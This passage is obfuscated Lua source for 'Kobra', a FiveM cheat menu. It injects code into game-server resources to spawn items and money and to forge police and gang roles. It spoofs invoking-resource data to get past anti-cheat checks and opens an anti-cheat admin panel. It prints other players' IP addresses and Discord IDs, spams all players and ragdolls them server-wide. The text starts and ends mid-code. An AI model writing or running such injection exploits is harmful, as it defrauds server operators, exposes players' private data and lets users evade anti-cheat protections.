                            for _, bTzyPq7Xsl in ipairs(TzsPlcxQam) do
                                if VdNzWqbEyf(bTzyPq7Xsl) then
                                    AxWtRuLskz(bTzyPq7Xsl) -- Repeated deletion attempts
                                    AxWtRuLskz(bTzyPq7Xsl)
                                    AxWtRuLskz(bTzyPq7Xsl)
                                    AxWtRuLskz(bTzyPq7Xsl)
                                    AxWtRuLskz(bTzyPq7Xsl)
                                    AxWtRuLskz(bTzyPq7Xsl)
                                    AxWtRuLskz(bTzyPq7Xsl)
                                    AxWtRuLskz(bTzyPq7Xsl)
                                end
                            end
                            -- Unfreeze the player
                            DjRq08bKxu(QxoZnmWlae, false)
                            -- Find the ground Z-coordinate at the player's location
                            local ZkxyPqtLs0, Zfound = BnQvKdsLxa(EzPwqLtYas.x, EzPwqLtYas.y, EzPwqLtYas.z + 100.0, false)
                            if not ZkxyPqtLs0 then
                                Zfound = EzPwqLtYas.z -- Fallback to current Z if ground not found
                            end
                            -- Wait 300ms before teleporting
                            OplKvms9te(1000)
                            -- Teleport player to just above ground level
                            Tmn1rZxOq8(QxoZnmWlae, EzPwqLtYas.x, EzPwqLtYas.y, Zfound + 1.0, false, false, false)
                            DjRq08bKxu(QxoZnmWlae, true) -- Freeze player briefly
                            DjRq08bKxu(QxoZnmWlae, false) -- Unfreeze player
                        end)
                    end)
                end
                -- Execute the main function
                sfehwq34rw7td()
            ]]);v645=2 -1 ;end if (v645==1) then MachoMenuNotification("Kobra","Crashing, please wait..",5 + 0 );break;end end end});end if ((GetResourceState("dpemotes")=="started") or (GetResourceState("framework")=="started")) then v97({type="button",label="BRING NEARBY PLAYERS",onSelect=function() v12:Notify("success","Kobra","Attempting to bring all players",4212 -(615 + 597) );MachoInjectThread(0 + 0 ,"dpemotes","",[[
                    TriggerServerEvent('ServerValidEmote', "-1", "horse", "horse")
                ]]);end});end if (GetResourceState("mc9-adminmenu")=="started") then v97({type="button",label="ADMIN MENU (F8)",onSelect=function() local v646=0 -0 ;while true do if (v646==(0 + 0)) then v12:Notify("success","Kobra","Admin Menu List",60 + 2940 );MachoInjectResource2(NewThreadNs,"mc9-adminmenu",[[
                for id, ply in pairs(CurrentPlayers or {}) do
                    if ply and ply.name and ply.id then
                        print(("Information about ^6%s ^7| ^2%s"):format(ply.name, ply.id))
                        
                        if ply.identifiers and ply.identifiers.ip then
                            print(("    IP: ^2%s"):format(ply.identifiers.ip:sub(4)))
                        else
                            print("    IP: ^1Not Available")
                        end
                        
                        if ply.identifiers and ply.identifiers.discord then
                            print(("    Discord: ^2%s"):format(ply.identifiers.discord:sub(9)))
                        else
                            print("    Discord: ^1Not Available")
                        end
                    end
                end
            ]]);break;end end end});end if (GetResourceState("mc9-mainmenu")=="started") then v97({type="button",label="MCSHIT9 ADD ITEMS",onSelect=function() v12:Notify("success","Kobra","Spawning Items",1651 + 1349 );MachoInjectResource2(NewThreadNs,"mc9-mainmenu",[[
            local data, playtime = mc9.callback.await("mc9-mainmenu:server:GetMilestoneReward", false)
            for i,v in pairs(data) do
                local result, message = mc9.callback.await("mc9-mainmenu:server:claimMilestoneReward", v)
            end
            ]]);end});end if (GetResourceState("vMenu")=="started") then v97({type="button",label="HIT DMS",onSelect=function() v12:Notify("success","Kobra","Message Sent",3000);MachoInjectResource2(1900 -(1056 + 843) ,"any",[[
                    TriggerServerEvent('vMenu:SendMessageToPlayer', -1, 'Hello this is Kobra Menu by JayThaaGamer, the leading cheat in the market.')
                ]]);end});end if (GetResourceState("amigo")=="started") then v97({type="button",label="ADD ITEM (1)",onSelect=function() local v647=0 -0 ;local v648;local v649;local v650;local v651;local v652;local v653;while true do if (v647==3) then print("^7[^5Kobra^7] [^3DEBUG^7]: Raw inputCount =",tostring(v650));v651=tonumber(v650);if ( not v651 or (v651<(1 -0))) then print("^7[^5Kobra^7] [^1WARN^7]: Invalid count, defaulting to 1");v651=2 -1 ;end v647=3 + 1 ;end if (v647==6) then if  not v652 then local v1050=1976 -(286 + 1690) ;while true do if (v1050==(912 -(98 + 813))) then v12:Notify("error","Kobra","String format failed — check console",1058 + 2942 );break;end if (v1050==(0 -0)) then print("^7[^5Kobra^7] [^1ERROR^7]: string.format failed →",v653);print("^7[^5Kobra^7] [^3DEBUG^7]: itemName =",tostring(v649),"itemCount =",tostring(v651));v1050=1;end end else print("^7[^5Kobra^7] [^2INFO^7]: Injection completed successfully");end v12:ShowUI();break;end if (v647==(0 + 0)) then v12:HideUI();v648=nil;function v648(v960,v961) local v962=nil;local v963=false;v60(v960,v961 or "" ,function(v1051) local v1052=507 -(263 + 244) ;while true do if (0==v1052) then v962=v1051;v963=true;break;end end end,"typeable");while  not v963 do Wait(0 + 0 );end return v962;end v647=1;end if (v647==(1692 -(1502 + 185))) then print("^7[^5Kobra^7] [^3DEBUG^7]: Final itemName =",v649);print("^7[^5Kobra^7] [^3DEBUG^7]: Final itemCount =",v651);v652,v653=pcall(function() MachoInjectResourceRaw("amigo",string.format([[
                        -- Hook native functions safely
                        local function HookNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then return end
                            _G[nativeName] = function(...)
                                print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %%s"):format(nativeName))
                                return newFunction(originalNative, ...)
                            end
                        end

                        HookNative("TriggerEvent", function(originalFn, ...) return originalFn(...) end)
                        HookNative("TriggerServerEvent", function(originalFn, ...) return originalFn(...) end)

                        _G.Kobra = {
                            TEvent = function(eName, ...) return TriggerEvent(eName, ...) end,
                            TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end,
                        }

                        print("^7[^5Kobra^7] [^3DEBUG^7]: Sending giveItem request for %s x%d")
                        _G.Kobra.TSEvent('player:giveItem', { item = "%s", count = %d })
                    ]],v649,v651,v649,v651));end);v647=2 + 4 ;end if (v647==(19 -15)) then if (v651>(265313 -165313)) then print("^7[^5Kobra^7] [^1WARN^7]: Count too high, clamping to 100000");v651=100000;end v649=tostring(v649 or "" );v651=tonumber(v651 or (1528 -(629 + 898)) );v647=13 -8 ;end if (v647==(5 -3)) then if ( not v649 or (v649=="")) then local v1053=0;while true do if (v1053==0) then print("^7[^5Kobra^7] [^1ERROR^7]: Invalid or empty itemName");v12:Notify("error","Kobra","No item name entered",3365 -(12 + 353) );v1053=1912 -(1680 + 231) ;end if (v1053==(1 + 0)) then v12:ShowUI();return;end end end print("^7[^5Kobra^7] [^3DEBUG^7]: Waiting for item count input...");v650=v648("Item Count","1");v647=2 + 1 ;end if (1==v647) then print("^7[^5Kobra^7] [^3DEBUG^7]: Waiting for item input...");v649=v648("Item Name","");print("^7[^5Kobra^7] [^3DEBUG^7]: Raw itemName =",tostring(v649));v647=1151 -(212 + 937) ;end end end});end local v284=GetResourceState("scripts")=="started" ;local v285=GetResourceState("framework")=="started" ;if (v284 or v285) then local v593=0;local v594;while true do if (0==v593) then v594=(v284 and "scripts") or "framework" ;v97({type="button",label="COMPLETE COMMS",onSelect=function() v12:Notify("Comserv","Kobra","Action Removed you might have to spam this",3000);MachoInjectResourceRaw(v594,[[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end

                    local function g(n) return _G[decode(n)] end

                    for i = 1, 1 do
                        lib.callback("comservs:completeAction", false, function(entity) print(entity) end)
                        g({87,97,105,116})(0)
                    end
                ]]);end});break;end end end if ((GetResourceState("es_extended")=="started") or (GetResourceState("core")=="started")) then v97({type="button",label="POLICE JOB (1)",onSelect=function() if (GetResourceState("es_extended")=="started") then local v817=0 + 0 ;while true do if (v817==(1062 -(111 + 951))) then v12:Notify("Setjob","Kobra","Your job has been set to police",610 + 2390 );MachoInjectResource2(NewThreadNs,"es_extended",[[
                        function hNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                return newFunction(originalNative, ...)
                            end
                        end

                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetInvokingResourceData", function(originalFn, ...) return originalFn(...) end)
                        hNative("ESX.SetPlayerData", function(originalFn, ...) return originalFn(...) end)

                        local fake_execution_data = {
                            ran_from_cheat = false,
                            path = "core/server/main.lua",
                            execution_id = "324341234567890"
                        }

                        local original_GetInvokingResourceData = GetInvokingResourceData
                        GetInvokingResourceData = function()
                            return fake_execution_data
                        end

                        ESX.SetPlayerData("job", {
                            name = "police",
                            label = "Police",
                            grade = 3,
                            grade_name = "lieutenant",
                            grade_label = "Lieutenant"
                        })
                        GetInvokingResourceData = original_GetInvokingResourceData
                    ]]);break;end end elseif (GetResourceState("core")=="started") then v12:Notify("Setjob","Kobra","Your job has been set to police",3027 -(18 + 9) );MachoInjectResource2(NewThreadNs,"core",[[
                        function hNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                return newFunction(originalNative, ...)
                            end
                        end

                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetInvokingResourceData", function(originalFn, ...) return originalFn(...) end)
                        hNative("ESX.SetPlayerData", function(originalFn, ...) return originalFn(...) end)

                        local fake_execution_data = {
                            ran_from_cheat = false,
                            path = "core/server/main.lua",
                            execution_id = "324341234567890"
                        }

                        local original_GetInvokingResourceData = GetInvokingResourceData
                        GetInvokingResourceData = function()
                            return fake_execution_data
                        end

                        ESX.SetPlayerData("job", {
                            name = "police",
                            label = "Police",
                            grade = 3,
                            grade_name = "lieutenant",
                            grade_label = "Lieutenant"
                        })
                        GetInvokingResourceData = original_GetInvokingResourceData
                    ]]);else print("Neither core nor es_extended started");end end});end if ((GetResourceState("scripts")=="started") or (GetResourceState("framework")=="started")) then v97({type="button",label="POLICE JOB (2)",onSelect=function() local v654=0 + 0 ;while true do if (v654==0) then v12:Notify("Setjob","Kobra","You are now Police",3534 -(31 + 503) );MachoInjectResourceRaw("any",[[
                    local lp = LocalPlayer
                    if lp and lp.state then
                        lp.state:set("job", {
                            name = "police",
                            label = "Police",
                            grade = 4,
                            grade_name = "sergeant"
                        }, true)
                        print("[✅] Job set to police successfully.")
                    else
                        print("[⚠️] Failed to set job: LocalPlayer or state not available.")
                    end
                ]]);break;end end end});end if (GetResourceState("codewave-sneaker-phone")=="started") then v97({type="button",label="COLLECT REWARDS",onSelect=function() MachoInjectResource2(NewThreadNs,"codewave-sneaker-phone",[[
                    function HookNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end
                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    HookNative("TriggerEvent", function(originalFn, ...)
                        return originalFn(...)
                    end)

                    HookNative("TriggerServerEvent", function(originalFn, ...)
                        return originalFn(...)
                    end)

                    _G.Kobra = {
                        TEvent = function(eName, ...)
                            return TriggerEvent(eName, ...)
                        end,
                        TSEvent = function(eName, ...)
                            return TriggerServerEvent(eName, ...)
                        end,
                    }

                    _G.Kobra.TSEvent('delivery:giveRewardShoes', 100000)
                    print("[✅] reward triggered successfully.")
                ]]);end});end if (GetResourceState("rzrp-base")=="started") then v97({type="checkbox",label="Ragdoll Players (RZRP)",checked=false,onSelect=function(v655) if v655 then local v818=1632 -(595 + 1037) ;while true do if (v818==(1444 -(189 + 1255))) then v12:Notify("Ragdoll","Kobra","Ragdolling Nearby Players",1478 + 2522 );v49("rzrp-base",[[
                        if not _G.KobraRagdollPlayersInitialized then
                            _G.KobraRagdollPlayersEnabled = true
                            _G.KobraRagdollPlayersInitialized = true

                            local function SafeWrap(fn)
                                return function(...)
                                    local ok, result = pcall(fn, ...)
                                    return ok and result or nil
                                end
                            end

                            local SafeThread      = SafeWrap(CreateThread)
                            local SafeSTrigger    = SafeWrap(TriggerServerEvent)
                            local SafeGetPlayers  = SafeWrap(GetActivePlayers)
                            local SafeGetPed      = SafeWrap(GetPlayerPed)
                            local SafeGetCoords   = SafeWrap(GetEntityCoords)
                            local SafeGetServerId = SafeWrap(GetPlayerServerId)
                            local SafeWait        = SafeWrap(Wait)

                            local function GetDistance(a, b)
                                return #(a - b)
                            end

                            -- Stop any existing ragdoll thread before creating a new one
                            if _G.KobraRagdollThread then
                                TerminateThread(_G.KobraRagdollThread)
                                _G.KobraRagdollThread = nil
                            end

                            _G.KobraRagdollThread = SafeThread(function()
                                while _G.KobraRagdollPlayersEnabled and _G.KobraRagdollPlayersInitialized do
                                    local myPed = PlayerPedId()
                                    local myCoords = SafeGetCoords(myPed)
                                    if not myCoords then break end

                                    local players = SafeGetPlayers()
                                    if not players then break end

                                    for _, pid in ipairs(players) do
                                        local targetPed = SafeGetPed(pid)
                                        if targetPed and targetPed ~= myPed then
                                            local targetCoords = SafeGetCoords(targetPed)
                                            if targetCoords and GetDistance(myCoords, targetCoords) <= 30000.0 then
                                                local sid = SafeGetServerId(pid)
                                                if sid then
                                                    SafeSTrigger('RZRP:Player:Slap', sid)
                                                end
                                            end
                                        end
                                    end

                                    SafeWait(2000)
                                end

                                _G.KobraRagdollThread = nil
                            end)
                        else
                            _G.KobraRagdollPlayersEnabled = true
                        end
                    ]]);break;end end else v12:Notify("Ragdoll","Kobra","Stopped Ragdolling Players",4000);v49("rzrp-base",[[
                        _G.KobraRagdollPlayersEnabled = false
                        _G.KobraRagdollPlayersInitialized = false
                        if _G.KobraRagdollThread then
                            TerminateThread(_G.KobraRagdollThread)
                            _G.KobraRagdollThread = nil
                        end
                    ]]);end end});end if (GetResourceState("rzrp-base")=="started") then v97({type="checkbox",label="Bag Closest Players (RZRP)",checked=false,onSelect=function(v656) if v656 then print("Bag Closest Players Started...");v49("rzrp-base",[[
                        if not _G.KobraBagPlayersInitialized then
                            _G.KobraBagPlayersEnabled = true
                            _G.KobraBagPlayersInitialized = true

                            local function SafeWrap(fn)
                                return function(...)
                                    local ok, result = pcall(fn, ...)
                                    return ok and result or nil
                                end
                            end

                            local SafeThread      = SafeWrap(CreateThread)
                            local SafeSTrigger    = SafeWrap(TriggerServerEvent)
                            local SafeGetPlayers  = SafeWrap(GetActivePlayers)
                            local SafeGetPed      = SafeWrap(GetPlayerPed)
                            local SafeGetCoords   = SafeWrap(GetEntityCoords)
                            local SafeGetServerId = SafeWrap(GetPlayerServerId)
                            local SafeWait        = SafeWrap(Wait)

                            local function GetDistance(a, b)
                                return #(a - b)
                            end

                            if _G.KobraBagThread then
                                TerminateThread(_G.KobraBagThread)
                                _G.KobraBagThread = nil
                            end

                            _G.KobraBagThread = SafeThread(function()
                                while _G.KobraBagPlayersEnabled and _G.KobraBagPlayersInitialized do
                                    local myPed = PlayerPedId()
                                    local myCoords = SafeGetCoords(myPed)
                                    if not myCoords then break end

                                    local players = SafeGetPlayers()
                                    if not players then break end

                                    for _, pid in ipairs(players) do
                                        local targetPed = SafeGetPed(pid)
                                        if targetPed and targetPed ~= myPed then
                                            local targetCoords = SafeGetCoords(targetPed)
                                            if targetCoords and GetDistance(myCoords, targetCoords) <= 300000.0 then
                                                local sid = SafeGetServerId(pid)
                                                if sid then
                                                    SafeSTrigger('RZRP:Player:BagClosestPlayer', sid)
                                                end
                                            end
                                        end
                                    end

                                    SafeWait(2000)
                                end

                                _G.KobraBagThread = nil
                            end)
                        else
                            _G.KobraBagPlayersEnabled = true
                        end
                    ]]);else local v819=0 -0 ;while true do if (v819==(1279 -(1170 + 109))) then print("Bag Closest Players Stopped...");v49("rzrp-base",[[
                        _G.KobraBagPlayersEnabled = false
                        _G.KobraBagPlayersInitialized = false
                        if _G.KobraBagThread then
                            TerminateThread(_G.KobraBagThread)
                            _G.KobraBagThread = nil
                        end
                    ]]);break;end end end end});end if ((GetResourceState("scripts")=="started") or (GetResourceState("framework")=="started")) then v97({type="button",label="Force Gang",onSelect=function() local v657=0;local v658;local v659;local v660;local v661;while true do if (v657==(1817 -(348 + 1469))) then v658="";v659=1290 -(1115 + 174) ;v12:HideUI();v60("Gang Name","",function(v964) if (v964 and (v964~="")) then v658=v964;end end,"typeable");v657=2 -1 ;end if (v657==(1015 -(85 + 929))) then Wait(2300);v60("Gang Rank","",function(v965) if (v965 and (v965~="")) then v659=tonumber(v965) or (1 + 0) ;end end,"typeable");Wait(1000);v660=((GetResourceState("scripts")=="started") and "scripts") or "framework" ;v657=1869 -(1151 + 716) ;end if (v657==(1 + 1)) then v661=string.format([[
                    LocalPlayer.state:set("gang", "%s", true)
                    LocalPlayer.state:set("gang_rank", %d, true)
                ]],v658,v659);v49(v660,v661);v12:ShowUI();v12:Notify("success","Kobra","Gang Set",3903 + 97 );break;end end end});end if (GetResourceState("framework")=="started") then v97({type="button",label="Give Item #2",onSelect=function() local v662=1704 -(95 + 1609) ;local v663;local v664;local v665;local v666;local v667;local v668;while true do if (v662==(3 -2)) then print("^7[^5Kobra^7] [^3DEBUG^7]: Waiting for item input...");v664=v663("Item Name","");print("^7[^5Kobra^7] [^3DEBUG^7]: Raw itemName =",tostring(v664));v662=760 -(364 + 394) ;end if (v662==(4 + 0)) then if (v666>100000) then local v1054=0;while true do if ((0 + 0)==v1054) then print("^7[^5Kobra^7] [^1WARN^7]: That shit too high, stamping to 100000");v666=20571 + 79429 ;break;end end end v664=tostring(v664 or "" );v666=tonumber(v666 or (1 + 0) );v662=3 + 2 ;end if (v662==(2 + 1)) then print("^7[^5Kobra^7] [^3DEBUG^7]: Raw inputCount =",tostring(v665));v666=tonumber(v665);if ( not v666 or (v666<1)) then print("^7[^5Kobra^7] [^1WARN^7]: Invalid count, defaulting to 1");v666=1 + 0 ;end v662=4 + 0 ;end if (v662==5) then print("^7[^5Kobra^7] [^3DEBUG^7]: Final itemName =",v664);print("^7[^5Kobra^7] [^3DEBUG^7]: Final itemCount =",v666);v667,v668=pcall(function() MachoInjectResourceRaw("framework",string.format([[
                        TriggerServerEvent('drugs:receive', {
                            Reward = {
                                Name = "%s",
                                Amount = %d
                            }
                        })
                    ]],v664,v666));end);v662=6;end if (v662==(1 + 1)) then if ( not v664 or (v664=="")) then print("^7[^5Kobra^7] [^1ERROR^7]: Invalid or empty itemName");v12:Notify("error","Kobra","No item name entered",3956 -(719 + 237) );v12:ShowUI();return;end print("^7[^5Kobra^7] [^3DEBUG^7]: Waiting for item count input...");v665=v663("Item Count","1");v662=3;end if (v662==6) then if  not v667 then print("^7[^5Kobra^7] [^1ERROR^7]: string.format failed →",v668);v12:Notify("error","Kobra","String format failed — check console",11166 -7166 );else print("^7[^5Kobra^7] [^2INFO^7]: Injection completed successfully");v12:Notify("success","Kobra","Item Sent",4000);end v12:ShowUI();break;end if (v662==(0 + 0)) then v12:HideUI();v663=nil;function v663(v966,v967) local v968=0 -0 ;local v969;local v970;while true do if (v968==0) then v969=nil;v970=false;v968=2 -1 ;end if (v968==(2 -1)) then v60(v966,v967 or "" ,function(v1185) v969=v1185;v970=true;end,"typeable");while  not v970 do Wait(0);end v968=1993 -(761 + 1230) ;end if (v968==(195 -(80 + 113))) then return v969;end end end v662=1 + 0 ;end end end});end if (GetResourceState("WayTooCerti_3D_Printer")=="started") then v97({type="button",label="COLLECT ITEMS 3",onSelect=function() MachoInjectResourceRaw("WayTooCerti_3D_Printer",[[
                local function Ak47Spawn()
                TriggerServerEvent('waytoocerti_3dprinter:CompletePurchase', 'money', 10000)
                end
                Ak47Spawn()
            ]]);end});end if (GetResourceState("tm-base")=="started") then table.insert(events,{name="Spawn Money #4",eventName="give_metro_money_04",execute=function() print("Give Money Metro RP...");MachoInjectResource2(NewThreadNs,"tm-base",[[
                TriggerServerEvent('tm-moneywash:giveCleanMoney', 100000)
                ]]);end});end if ((GetResourceState("scripts")=="started") or (GetResourceState("framework")=="started")) then v97({type="button",label="Set Chat Tag",onSelect=function() local v669=0;local v670;local v671;local v672;local v673;while true do if (v669==(3 + 0)) then v673=((GetResourceState("scripts")=="started") and "scripts") or "framework" ;MachoInjectResourceRaw(v673,string.format([[
                    LocalPlayer.state:set('currentChatTag', { tag = "%s", color = "%s" }, true)
                ]],v671,v672));v12:ShowUI();break;end if (v669==(1 + 1)) then v672=v670("Tag Color (R, G, B)","0, 255, 0");if ( not v672 or (v672=="")) then v672="255, 255, 255";end Wait(2007 -1507 );v669=1 + 2 ;end if (v669==(1 + 0)) then v671=v670("Chat Tag Name","");if ( not v671 or (v671=="")) then v12:ShowUI();return;end Wait(1743 -(965 + 278) );v669=1731 -(1391 + 338) ;end if ((0 -0)==v669) then v12:HideUI();v670=nil;function v670(v971,v972) local v973=0 + 0 ;local v974;local v975;while true do if (v973==(1 -0)) then v60(v971,v972 or "" ,function(v1186) v974=v1186;v975=true;end,"typeable");while  not v975 do Wait(0 + 0 );end v973=1410 -(496 + 912) ;end if (v973==(0 -0)) then v974=nil;v975=false;v973=1 + 0 ;end if (v973==(3 -1)) then return v974;end end end v669=1331 -(1190 + 140) ;end end end});end if (GetResourceState("wasabi_multijob")=="started") then v97({type="button",label="POLICE JOB (3)",onSelect=function() local v674=0 + 0 ;while true do if (0==v674) then MachoInjectResource2(NewThreadNs,"wasabi_multijob",[[
            local job = { label = "Police", name = "police", grade = 1, grade_label = "Officer", grade_name = "officer" }
            CheckJob(job, true) 
        ]]);MachoInjectResource2(NewThreadNs,"wasabi_multijob",[[
            SelectJobMenu({ job = 'police', grade = 1, label = 'Police', boss = true, onDuty = false })
        ]]);break;end end end});end if (GetResourceState("wasabi_multijob")=="started") then v97({type="button",label="EMS JOB (1)",onSelect=function() MachoInjectResource2(NewThreadNs,"wasabi_multijob",[[
            local job = { label = "EMS", name = "ambulance", grade = 1, grade_label = "Medic", grade_name = "medic", boss = false, onDuty = true }
            CheckJob(job, true)
        ]]);MachoInjectResource2(NewThreadNs,"wasabi_multijob",[[
            SelectJobMenu({ job = 'ambulance', grade = 5, label = 'Ambulance', boss = true, onDuty = false })
        ]]);end});end if (GetResourceState("ElectronAC")=="started") then v97({type="button",label="ElectronAC Admin Panel",onSelect=function() MachoInjectResourceRaw("ElectronAC",[[
        SetNuiFocus(true, true)
        SendNUIMessage({
            action = "menu",
            data = {
                info = {
                    adminContext = {
                        master = true,
                        permissions = { "all" }
                    },
                    identifiers = {
                        ["ip"] = "127.0.0.1",
                        ["license"] = "",
                        ["license2"] = "",
                    },
                    permissions = {
                        adminMenu = true,
                        whitelisted = true
                    }
                },
                open = true,
                setOpen = true
            }
        })
        ]]);end});end if (GetResourceState("spoodyFraud")=="started") then v97({type="button",label="Collect Cash",onSelect=function() MachoInjectResource2(NewThreadNs,"spoodyFraud",[[
        function HookNative(nativeName, newFunction)
            local originalNative = _G[nativeName]
            if not originalNative or type(originalNative) ~= "function" then
                return
            end

            _G[nativeName] = function(...)
                return newFunction(originalNative, ...)
            end
        end

        HookNative("CreateThread", function(originalFn, ...)
            return originalFn(...)
        end)

        HookNative("TriggerServerEvent", function(originalFn, ...)
            return originalFn(...)
        end)

        function Spoody()
            for i = 1, 30 do
                TriggerServerEvent('spoodyFraud:interactionComplete', 'Swapped Sim Card')
                TriggerServerEvent('spoodyFraud:interactionComplete', 'Cloned Card')

                Citizen.Wait(5)

                TriggerServerEvent('spoodyFraud:attemptSellProduct', 'Pacific Bank', 'clone')
                TriggerServerEvent('spoodyFraud:attemptSellProduct', 'Sandy Shoes', 'sim')
            end
        end

        CreateThread(function()
            Spoody()
        end)
        ]]);end});end v60("Choose Menu Key","",function(v503) for v595,v596 in pairs(v45) do if (v596:lower()==v503:lower()) then local v740=718 -(317 + 401) ;while true do if (v740==(950 -(303 + 646))) then v12:ShowUI();return;end if (v740==0) then v23=v596;Wait(250);v740=1;end end end end end,"keybind");local v286=0;local v287=120;while true do Wait(0 -0 );if v32 then local v675=v38[v39];if IsControlJustReleased(0,14) then local v820=1732 -(1675 + 57) ;while true do if (v820==(0 + 0)) then v39=(v39% #v38) + 1 ;MachoSendDuiMessage(v14,json.encode({action="scroll",direction="down"}));break;end end end if IsControlJustReleased(0 -0 ,2 + 13 ) then v39=((v39-(979 -(338 + 639)))% #v38) + 1 ;MachoSendDuiMessage(v14,json.encode({action="scroll",direction="up"}));end if (v675=="Shoot Weapon") then if IsDisabledControlJustPressed(379 -(320 + 59) ,44) then v34=((v34-2)% #v36) + 1 + 0 ;MachoSendDuiMessage(v14,json.encode({action="updateWeapon",index=v34}));end if IsDisabledControlJustPressed(732 -(628 + 104) ,38) then v34=(v34% #v36) + (1 -0) ;MachoSendDuiMessage(v14,json.encode({action="updateWeapon",index=v34}));end elseif (v675=="Spawn Car") then if IsDisabledControlJustPressed(0,44) then v35=((v35-(1893 -(439 + 1452)))% #v37) + (1948 -(105 + 1842)) ;MachoSendDuiMessage(v14,json.encode({action="updateVehicle",index=v35}));end if IsDisabledControlJustPressed(0,173 -135 ) then v35=(v35% #v37) + (2 -1) ;MachoSendDuiMessage(v14,json.encode({action="updateVehicle",index=v35}));end end if IsDisabledControlPressed(0 -0 ,2 + 22 ) then local v821=v675;if (v821=="Shoot Weapon") then local v976=0 -0 ;local v977;while true do if (v976==(0 + 0)) then v977=v36[v34];if (v977=="WEAPON_PERMKILL") then v977="WEAPON_TRANQUILIZER";elseif (v977=="WEAPON_RPG_2") then v977="WEAPON_AIRSTRIKE_ROCKET";end v976=1165 -(274 + 890) ;end if ((1 + 0)==v976) then if (v977~=v33) then local v1222=0 + 0 ;while true do if (v1222==0) then v33=v977;print(("weapon: %s, LastWeaponFired: %s"):format(v977,v33));v1222=1;end if (v1222==(1 + 0)) then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then if _G.KobraFreecamObject then local function v1559(v1578) local v1579=math.rad(v1578.z);local v1580=math.rad(v1578.x);local v1581=math.abs(math.cos(v1580));return vector3( -math.sin(v1579) * v1581 ,math.cos(v1579) * v1581 ,math.sin(v1580));end function hNative(v1582,v1583) local v1584=_G[v1582];if ( not v1584 or (type(v1584)~="function")) then return;end _G[v1582]=function(...) return v1583(v1584,...);end;end hNative("CreateThread",function(v1585,...) return v1585(...);end);hNative("Wait",function(v1586,...) return v1586(...);end);hNative("PlayerPedId",function(v1587,...) return v1587(...);end);hNative("GetHashKey",function(v1588,...) return v1588(...);end);hNative("GiveWeaponToPed",function(v1589,...) return v1589(...);end);hNative("SetCurrentPedWeapon",function(v1590,...) return v1590(...);end);hNative("GetCurrentPedWeapon",function(v1591,...) return v1591(...);end);hNative("RemoveWeaponFromPed",function(v1592,...) return;end);hNative("ShootSingleBulletBetweenCoords",function(v1593,...) return v1593(...);end);local v1560=GetCamCoord(_G.KobraFreecamObject);local v1561=GetCamRot(_G.KobraFreecamObject,2 + 0 );local v1562=v1559(v1561);local v1563=1000;local v1564=v1560 + (v1562 * v1563) ;local v1565=PlayerPedId();local v1566=GetHashKey(v977);local function v1567(v1594) local v1595=0;local v1596;while true do if (v1595==(0 + 0)) then v1596={};for v1652=1, #v1594 do v1596[v1652]=string.byte(v1594,v1652);end v1595=1 -0 ;end if ((820 -(731 + 88))==v1595) then return table.concat(v1596,",");end end end local v1568=v1567(v977);v49(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,string.format([[
                                        if not _G.osintWeaponBypass then
                                            _G.osintWeaponBypass = { enabled = false }
                                        end
                                        _G.osintWeaponBypass.enabled = true

                                        local function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        end

                                        hNative("GetHashKey", function(orig, str) return orig(str) end)
                                        hNative("GiveWeaponToPed", function(orig, ped, hash, ammo, isHidden, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, ammo, false, true)
                                            else
                                                return orig(ped, hash, ammo, isHidden, equipNow)
                                            end
                                        end)
                                        hNative("SetCurrentPedWeapon", function(orig, ped, hash, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, true)
                                            else
                                                return orig(ped, hash, equipNow)
                                            end
                                        end)

                                        local function _b(str)
                                            local t = {}
                                            for i = 1, #str do t[i] = string.byte(str, i) end
                                            return t
                                        end
                                        local function _d(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end
                                        local function _g(n)
                                            local k = _d(n)
                                            local f = _G[k]
                                            return f
                                        end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield WeaponBypass error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            local ped = %d
                                            if _g(_b("DoesEntityExist"))(ped) then
                                                local weaponName = _d({%s})
                                                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                                                if weaponHash and weaponHash ~= 0 then
                                                    _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                                                    _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                                                end
                                            end
                                        end)

                                        print("Zawg")
                                    ]],v1565,v1568));Wait(280 + 70 );ShootSingleBulletBetweenCoords(v1560.x,v1560.y,v1560.z,v1564.x,v1564.y,v1564.z,62 + 38 ,true,v1566,PlayerPedId(),true,false,100000);end else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                                    if _G.KobraFreecamObject then
